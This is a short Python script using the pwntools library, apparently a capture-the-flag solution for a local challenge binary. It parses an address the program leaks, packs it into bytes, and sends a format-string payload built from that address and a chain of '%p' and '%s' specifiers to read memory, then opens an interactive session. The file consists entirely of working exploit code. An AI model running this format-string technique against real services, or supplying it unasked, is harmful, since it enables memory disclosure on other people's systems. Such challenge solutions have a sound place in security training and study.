#! /usr/bin/python3

from pwn import *

HOST = ''
PORT = ''

p = process('./chall')

# [+] Starting local process './chall': pid 24502
# b'This may help later : 0x570a31a0\nName : '
address = p.recv().split()[5]

# Construction 1 : Manually
# firstByte = bytes.fromhex(str(address[2:4])[2:-1])
# secondByte = bytes.fromhex(str(address[4:6])[2:-1])
# thirdByte = bytes.fromhex(str(address[6:8])[2:-1])
# fourthByte = bytes.fromhex(str(address[8:10])[2:-1])

# print(firstByte, secondByte, thirdByte, fourthByte)


# Construction 2 : ysing p32() Util of pwn tools
addressBytesInStack = p32(int(str(address)[2:-1], 16))


p.sendline(b'AA' + addressBytesInStack + b' %p %p %p %p %p %p %s ')


p.interactive()
